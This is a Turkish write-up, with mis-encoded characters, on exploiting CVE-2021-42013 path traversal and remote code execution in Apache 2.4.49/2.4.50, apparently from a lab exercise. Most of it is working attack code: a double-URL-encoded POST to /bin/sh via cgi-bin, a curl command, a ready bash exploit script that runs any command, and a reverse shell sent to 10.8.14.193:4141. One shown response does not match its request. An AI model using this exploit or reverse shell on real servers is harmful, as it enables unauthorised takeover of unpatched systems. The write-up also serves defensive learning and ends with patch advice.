# Apache HTTP Server 2.4.49/2.4.50 | CVE-2021-42013 | Remote Code Execution

### **Zafiyet:** `Path Traversal` + `Remote Code Execution`
### **CVE:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## GiriÅŸ

Bu Ã§alÄ±ÅŸmada, Apache HTTP Server 2.4.49 ve 2.4.50 sÃ¼rÃ¼mlerinde keÅŸfedilen ve CVE-2021-42013 olarak tanÄ±mlanan kritik bir uzaktan kod Ã§alÄ±ÅŸtÄ±rma (RCE) zafiyetinin pratik istismar sÃ¼reci anlatÄ±lmÄ±ÅŸtÄ±r. Zafiyet, hatalÄ± URL Ã§Ã¶zÃ¼mleme ve CGI dosyalarÄ±nÄ±n kontrolsÃ¼z Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±ndan kaynaklanmaktadÄ±r. Bu yazÄ±da zafiyetin manuel olarak nasÄ±l doÄŸrulandÄ±ÄŸÄ±, `curl` ve Burp Suite ile nasÄ±l test edildiÄŸi, bir reverse shell elde edilerek istismarÄ±n nasÄ±l tamamlandÄ±ÄŸÄ± adÄ±m adÄ±m gÃ¶sterilmiÅŸtir.

---

## 1. Zafiyetin TanÄ±mÄ±

Apache HTTP Server 2.4.49 ve 2.4.50 sÃ¼rÃ¼mlerinde bulunan bir dizin geÃ§iÅŸi (`path traversal`) zafiyeti ile, `.cgi` dosyalarÄ± Ã¼zerinden komut Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼ndÃ¼r. Bu zafiyet `%%32%65` gibi **double URL encoding** ile filtreleri bypass etmeyi mÃ¼mkÃ¼n kÄ±lar.

![](https://github.com/ozcanpng/ozcanpng.github.io/blob/main/images/CVE-2021-42013.png)

> ğŸ’¡ **Zafiyetin KÃ¶keni:**  
Apache 2.4.49'da dizin geÃ§iÅŸi (path traversal) kontrolleri eksikti. 2.4.50 sÃ¼rÃ¼mÃ¼nde bu aÃ§Ä±k kapatÄ±lmaya Ã§alÄ±ÅŸÄ±lsa da, **Ã§ift katmanlÄ± URL encode (double encoding)** (`%%32%65` â†’ `%2e` â†’ `.`) ile koruma mekanizmalarÄ± atlatÄ±labiliyordu. AyrÄ±ca, CGI modÃ¼lÃ¼nÃ¼n `/bin/sh` gibi sistem dosyalarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmaya devam etmesi, bu zafiyeti kritik dÃ¼zeye Ã§Ä±kardÄ±.

---

## 2. Zafiyetin DoÄŸrulanmasÄ± (Manual Test)

Burp Suite Ã¼zerinden aÅŸaÄŸÄ±daki isteÄŸi gÃ¶nderdim:

```http
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 172.20.3.145
User-Agent: curl/8.13.0
Accept: */*
Content-Type: text/plain
Content-Length: 43
Connection: keep-alive

echo Content-Type: text/plain; echo; ls -la
```

YanÄ±t olarak hedef sistemdeki `uid=1(daemon)` Ã§Ä±ktÄ±sÄ±nÄ± aldÄ±m:

```http
HTTP/1.1 200 OK
Date: Wed, 23 Jul 2025 06:35:50 GMT
Server: Apache/2.4.50 (Unix)
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain
Content-Length: 45

uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Bu istekle, hedef sistemin komut Ã§alÄ±ÅŸtÄ±rabildiÄŸi doÄŸrulandÄ±.

> Not: `Content-Length` deÄŸeri **doÄŸru hesaplanmazsa** CGI cevap vermez. Bu yÃ¼zden Burp veya curl'da `--data-binary` kullanÄ±lmalÄ±dÄ±r.

---

## 3. curl ile Komut Ã‡alÄ±ÅŸtÄ±rma

```bash
curl -s --proxy http://127.0.0.1:8080 --path-as-is -H "Content-Type: text/plain" --data "echo Content-Type: text/plain; echo; id" http://172.20.3.145/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
```

YukarÄ±daki istekle tekrar `id` Ã§Ä±ktÄ±sÄ± doÄŸrulandÄ±.

---

## 4. Exploit Scripti KullanÄ±mÄ±

AÃ§Ä±ÄŸÄ± daha pratik kullanmak iÃ§in hazÄ±r bir `bash` scripti oluÅŸturdum:

```bash
#!/bin/bash

if [[ -z "$1" || -z "$2" ]]; then
  echo "Usage:"
  echo "    $0 <target> <path> '<command>'"
  echo "    $0 172.20.3.145 /bin/sh 'id'"
  exit
fi

curl -s --path-as-is -H "Content-Type: text/plain" --data "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```

---

## 5. Reverse Shell Elde Edilmesi

Netcat ile `4141` portundan dinleme yaptÄ±m:

```bash
nc -lvnp 4141
```

Ve aÅŸaÄŸÄ±daki reverse shell komutuyla baÄŸlantÄ± baÅŸlattÄ±m:

```bash
./cve-2021-42013.sh 172.20.3.145 /bin/bash 'bash -i >& /dev/tcp/10.8.14.193/4141 0>&1'
```

SonuÃ§ olarak hedef sistemden `bash` shell aldÄ±m:

![](https://github.com/ozcanpng/ozcanpng.github.io/blob/main/images/gettingShell.png)

---

## 6. SonuÃ§ ve Ã–nlem

Bu zafiyet Apache HTTP Server 2.4.49 ve 2.4.50 sÃ¼rÃ¼mlerine Ã¶zeldir ve CGI scriptlerinin bulunduÄŸu sistemlerde **kritik dÃ¼zeyde RCE** saÄŸlar. Apache 2.4.51 veya Ã¼zeri sÃ¼rÃ¼me gÃ¼ncellenmesi tavsiye edilir.

---

## Son SÃ¶z

CVE-2021-42013, temel URL parsing hatalarÄ±nÄ±n ne kadar kritik sonuÃ§lar doÄŸurabileceÄŸini gÃ¶steren gÃ¼zel bir Ã¶rnektir. Bu zafiyet sayesinde yalnÄ±zca birkaÃ§ satÄ±r komutla uzak bir Apache sunucusunda kod Ã§alÄ±ÅŸtÄ±rmak, hatta shell almak mÃ¼mkÃ¼n olmuÅŸtur. CGI modÃ¼lÃ¼ aktif olan sistemlerde bu tarz aÃ§Ä±klar zincirleme etki yaratabilir. Bu yÃ¼zden yalnÄ±zca sÃ¼rÃ¼m gÃ¼ncellemesi deÄŸil, sistemde aktif olan modÃ¼llerin ve dosya izinlerinin de dikkatle incelenmesi gerekir.
